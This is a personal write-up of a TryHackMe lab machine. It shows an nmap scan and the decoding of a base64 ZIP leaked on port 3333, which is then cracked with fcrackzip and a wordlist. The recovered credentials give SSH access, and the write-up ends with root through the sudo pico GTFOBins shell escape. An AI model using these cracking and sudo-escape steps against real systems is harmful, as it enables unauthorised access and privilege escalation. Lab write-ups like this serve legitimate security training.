## NMAP

```bash
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sV -sC 10.10.148.32 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 15:40 EDT
Nmap scan report for 10.10.148.32
Host is up (0.092s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:ae:18:87:b8:c3:35:b6:3a:af:0e:a4:c3:a2:ef:13 (RSA)
|   256 42:cf:fe:0d:cb:92:24:b9:8f:dc:11:d4:10:a7:a0:3e (ECDSA)
|_  256 5c:fc:bc:c9:3a:01:b1:b6:78:ac:66:3c:34:8f:22:2a (ED25519)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wheel of Fortune!
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43991/tcp   mountd
|   100005  1,2,3      51188/udp   mountd
|   100005  1,2,3      53990/udp6  mountd
|   100005  1,2,3      54207/tcp6  mountd
|   100021  1,3,4      38116/udp   nlockmgr
|   100021  1,3,4      38145/tcp   nlockmgr
|   100021  1,3,4      39708/udp6  nlockmgr
|   100021  1,3,4      45597/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs        3-4 (RPC #100003)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB
|     BAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA
|     UEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
9999/tcp open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.94SVN%I=7%D=4/14%Time=661C3154%P=aarch64-unknown-linux
SF:-gnu%r(NULL,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VV
SF:QJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAb
SF:RbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkA
SF:GAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLB
SF:QYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(GenericLines,124,"UEsDBAoACQAAAFSjjli
SF:Kv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAA
SF:AOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBA
SF:h4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
SF:\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(LP
SF:DString,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAA
SF:PwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHK
SF:k9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAA
SF:AAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAA
SF:AAAAQABAE8AAAByAAAAAAA=\n")%r(JavaRMI,124,"UEsDBAoACQAAAFSjjliKv3GtHwAA
SF:ABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnR
SF:aL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAA
SF:AAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0
SF:cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(kumo-server
SF:,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8
SF:C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSw
SF:cIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQA
SF:AAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQAB
SF:AE8AAAByAAAAAAA=\n")%r(GetRequest,124,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMA
SF:AAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b
SF:0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVK
SF:OOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV
SF:4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=\n")%r(HTTPOptions,124
SF:,"UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZ
SF:nV4CwAB\nBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir
SF:9xrR8AAAATAAAA\nUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKS
SF:BAAAAAGNyZWRzLnR4dFVU\nBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8A
SF:AAByAAAAAAA=\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.90 seconds

```

## Dirsearch 

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/vipin/reports/_10.10.148.32/_24-04-14_15-28-50.txt

Target: http://10.10.148.32/

[15:28:50] Starting: 
[15:29:18] 200 -  110KB - /favicon.ico                                      
                                                                             
Task Completed            
```

## User

```bash
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, JavaRMI, LPDString, NULL, kumo-server: 
|     UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwAB
|     BAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAA
|     UEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU
|_    BQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
9999/tcp open  http       Werkzeug httpd 1.0.1 (Python 3.6.9)
```

- the base 64 string according to cyberchef seems to be a ZIP, below is how I cracked it

```bash
                                                                                                       
┌──(vipin㉿vipin)-[~/Desktop]
└─$ echo 'UEsDBAoACQAAAFSjjliKv3GtHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAAPwLRxm8C0cZnV4CwABBAAAAAAEAAAAAOjukMXnRaL/b0hG/sRdaxmEI1JLOfuZYAbRbHKk9xNQSwcIir9xrR8AAAATAAAAUEsBAh4DCgAJAAAAVKOOWIq/ca0fAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVUBQAD8C0cZnV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=' | base64 -d > cred.zip
                                                                                                       
┌──(vipin㉿vipin)-[~/Desktop]
└─$ fcrackzip -u -D -p  /usr/share/wordlists/rockyou.txt /home/vipin/Desktop/cred.zip


PASSWORD FOUND!!!!: pw == peaceout
```

- lets unzip it!

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ unzip cred.zip
Archive:  cred.zip
[cred.zip] creds.txt password: 
 extracting: creds.txt               
                                                                                                       
┌──(vipin㉿vipin)-[~/Desktop]
└─$ cat creds.txt 
fortuna:MGE0OTJiM2
                                                                                                       
┌──(vipin㉿vipin)-[~/Desktop]
└─$ 
```

## Priv esc

```bash
┌──(vipin㉿vipin)-[~/Desktop]
└─$ ssh fortuna@$IP               
The authenticity of host '10.10.148.32 (10.10.148.32)' can't be established.
ED25519 key fingerprint is SHA256:UlktbYjOEgkrcijQ2e1j4iJ3u9hj8b2xzTtKJE5YTIw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.32' (ED25519) to the list of known hosts.
fortuna@10.10.148.32's password: 



        ################################
        ###  Come to try your luck?  ###
        ### Welcome to your fortune! ###
        ################################



fortuna@fortune:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
fortuna@fortune:~$ sudo -l
[sudo] password for fortuna: 
Matching Defaults entries for fortuna on fortune:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fortuna may run the following commands on fortune:
    (ALL : ALL) /usr/bin/pico
fortuna@fortune:~$ 
```

- seems like the pico binary has sudo perms!

- using gtfobins lets exploit

```exploit
sudo pico
^R^X
reset; sh 1>&0 2>&0
```

- above is how I got root

```bash
# python -c'import pty; pty.spawn("/bin/bash")'
root@fortune:~# 
```

- and i spawned a pty

```bash
root@fortune:/root# ls
flagtips.txt  king.txt
root@fortune:/root# cat flagtips.txt
Some flags are flags, some flags are games.
Good luck!
root@fortune:/root# echo 'vipin.b' > king.txt 
root@fortune:/root# cat king.txt
vipin.b
root@fortune:/root# 
```

- seems like there isnt a flag in root but i still put my name into king.txt


### MACHINE PWN'ED 😎

![My Tryhackme badge](https://tryhackme-badges.s3.amazonaws.com/vipin.b.png)


